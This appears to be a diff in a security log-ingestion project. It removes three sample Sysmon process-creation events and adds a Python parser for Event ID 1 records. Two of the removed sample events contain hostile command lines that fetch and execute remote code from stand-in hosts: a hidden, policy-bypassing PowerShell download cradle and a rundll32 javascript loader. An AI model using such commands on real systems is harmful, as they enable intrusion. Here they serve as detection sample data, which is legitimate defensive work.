@@ -1,3 +1,48 @@
-{"EventTime": "2025-02-20T10:15:22.123Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "WORKSTATION-01", "EventData": {"RuleName": "-", "UtcTime": "2025-02-20 10:15:22.123", "ProcessGuid": "{aabbccdd-1234-5678-9012-abcdef123456}", "ProcessId": "4567", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "FileVersion": "120.0.6099.71", "Description": "Google Chrome", "Product": "Google Chrome", "Company": "Google LLC", "OriginalFileName": "chrome.exe", "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-startup-window --disable-features=Translate", "CurrentDirectory": "C:\\Users\\test\\", "User": "test@domain.local", "LogonGuid": "{aabbccdd-0000-0000-0000-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=abc123def456...", "ParentProcessGuid": "{aabbccdd-0000-0001-0000-000000000001}", "ParentProcessId": "1234", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\explorer.exe"}}
-{"EventTime": "2025-02-21T14:45:10.456Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "WORKSTATION-02", "EventData": {"RuleName": "technique_id=T1059.001,technique_name=PowerShell", "UtcTime": "2025-02-21 14:45:10.456", "ProcessGuid": "{11223344-5566-7788-9900-fedcba987654}", "ProcessId": "7890", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Description": "Windows PowerShell", "Product": "Microsoft® Windows® Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\"", "CurrentDirectory": "C:\\Users\\Public\\", "User": "test@domain.local", "LogonGuid": "{11223344-0000-0000-0000-000000000000}", "LogonId": "0x1f4", "TerminalSessionId": "2", "IntegrityLevel": "High", "Hashes": "SHA256=def456ghi789...", "ParentProcessGuid": "{11223344-0000-0001-0000-000000000001}", "ParentProcessId": "3456", "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\explorer.exe"}}
-{"EventTime": "2025-02-22T09:30:05.789Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "SERVER-03", "EventData": {"RuleName": "technique_id=T1218.011,technique_name=Rundll32", "UtcTime": "2025-02-22 09:30:05.789", "ProcessGuid": "{99887766-5544-3322-1100-001122334455}", "ProcessId": "9012", "Image": "C:\\Windows\\System32\\rundll32.exe", "Description": "Windows Host Process (Rundll32)", "Product": "Microsoft® Windows® Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "RUNDLL32.EXE", "CommandLine": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/beacon.js\").Exec()", "CurrentDirectory": "C:\\Windows\\Temp\\", "User": "SYSTEM", "LogonGuid": "{99887766-0000-0000-0000-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA256=xyz987abc654...", "ParentProcessGuid": "{99887766-0000-0001-0000-000000000001}", "ParentProcessId": "678", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"}}
+# src/ingestion/parsers/sysmon_parser.py
+from typing import Dict, Any, Optional
+
+
+def parse_sysmon_event(raw: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    """
+    Parse a single Sysmon event (mainly Event ID 1 - Process Creation for MVP).
+    Returns a simplified flat dict or None if not supported.
+    """
+    event_id = raw.get("EventID") or raw.get("EventData", {}).get("EventID")
+
+    if event_id != 1:
+        # For MVP we only handle ProcessCreate; extend later for 3,7,11,13, etc.
+        return None
+
+    ed = raw.get("EventData", {})
+
+    parsed = {
+        "event_type": "process_creation",
+        "timestamp": raw.get("UtcTime") or raw.get("EventTime"),
+        "host": raw.get("Computer"),
+        "user": ed.get("User"),
+        "process": {
+            "image": ed.get("Image"),
+            "command_line": ed.get("CommandLine"),
+            "pid": ed.get("ProcessId"),
+            "guid": ed.get("ProcessGuid"),
+            "integrity_level": ed.get("IntegrityLevel"),
+            "hashes": ed.get("Hashes"),
+        },
+        "parent_process": {
+            "image": ed.get("ParentImage"),
+            "command_line": ed.get("ParentCommandLine"),
+            "pid": ed.get("ParentProcessId"),
+            "guid": ed.get("ParentProcessGuid"),
+        },
+        "logon": {
+            "logon_id": ed.get("LogonId"),
+            "logon_guid": ed.get("LogonGuid"),
+        },
+        "original_raw": raw,  # keep for debugging
+    }
+
+    # Clean up empty/none values if desired
+    if not parsed["timestamp"]:
+        parsed["timestamp"] = raw.get("TimeCreated", {}).get("SystemTime")
+
+    return parsed
